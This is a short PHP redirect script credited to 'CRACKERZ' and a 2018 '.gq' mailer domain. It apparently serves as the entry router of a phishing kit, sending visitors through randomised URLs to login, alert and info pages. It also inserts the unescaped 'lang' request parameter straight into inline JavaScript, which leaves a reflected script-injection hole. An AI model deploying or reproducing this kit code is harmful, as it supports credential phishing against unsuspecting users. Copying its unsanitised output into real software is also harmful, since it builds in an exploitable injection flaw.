<?php

session_start();



/* Programmer name :

		╔╗ ╦ ╦  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗╔═╗
		╠╩╗╚╦╝  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝╔═╝
		╚═╝ ╩   ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═╚═╝

 		      #2018  Mailer-inbox-unlimited.gq  */


function redir($too){
	$new = @$_GET['lang'];
	$rand = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 5)), 0, 20);
	//header('Location: '.$too.'?'.$rand.'&lang='.$new);
    echo '<script type="text/javascript">window.location.replace("'.$too.'?'.$rand.'&lang='.$new.'");</script>';
}



$pge = @$_GET['page'];


switch ($pge){
 
    case "login":
        $lang= 'login.php';
        break;

    case "more":
        $lang= 'more.php';
        break;

    case "alert":
        $lang= 'alert.php';
        break;

    case "info":
        $lang= 'info.php';
        break;

        default:
        $lang= "alert.php";
        break;
}


  		$_SESSION['_lang_'] = $_GET['lang'];
        echo redir($lang);


?>